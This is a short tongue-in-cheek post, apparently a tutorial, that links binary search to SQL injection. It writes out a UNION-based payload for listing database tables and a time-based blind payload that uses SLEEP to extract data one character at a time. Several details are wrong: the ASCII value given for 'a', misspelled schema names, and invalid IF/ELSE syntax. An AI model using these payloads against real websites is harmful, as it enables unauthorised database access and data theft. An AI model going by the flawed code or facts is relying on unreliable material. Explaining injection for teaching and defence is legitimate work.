# How is binary search useful?
Well, just by itself, it's not. The example code already knows the secret_value, so there is absolutely no need to deduce it. 

..
..

But there are certain scenario's where one might not actually know the secret_value. Then this cute little algorithm gets radically more interesting. For example, consider this rather common sql query which is uses in many webapplications:

```sql
SELECT x,y FROM z WHERE z.id=10 
```

The value 10 is often supplied by the user. If this value is not properly validated or sanitized, any innocent bystander might make a typo in the URL-bar and turn the query into this:

```sql
SELECT x,y 
  FROM z 
  WHERE z.id=10 
UNION SELECT 1,GROUP_CONCAT(table_name) 
  FROM information_scheme.tables 
  WHERE table_schema = database()
```

However, more often than not, the webpage doesn't directly show the results of the query directly. This oversight severely limits the websites' functionality. But it doesn't need to stay this way. Consider the following query carefully:

```sql
SELECT x,y 
  FROM z 
  WHERE z.id=10 
  AND IF( 
    ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_scheme = database()),1,1)) == 41,
    SLEEP(5) 
    ELSE NULL
  )
```
The integer 41 is the ascii value for the character 'a'. If this matches the first character of the queried string result (hence the substring), the if-statement is TRUE. This will, in turn, make the database sleep for 5 seconds. So if the website is responding quickly, we guessed the first letter wrong. If the website is slow, we guessed right. 
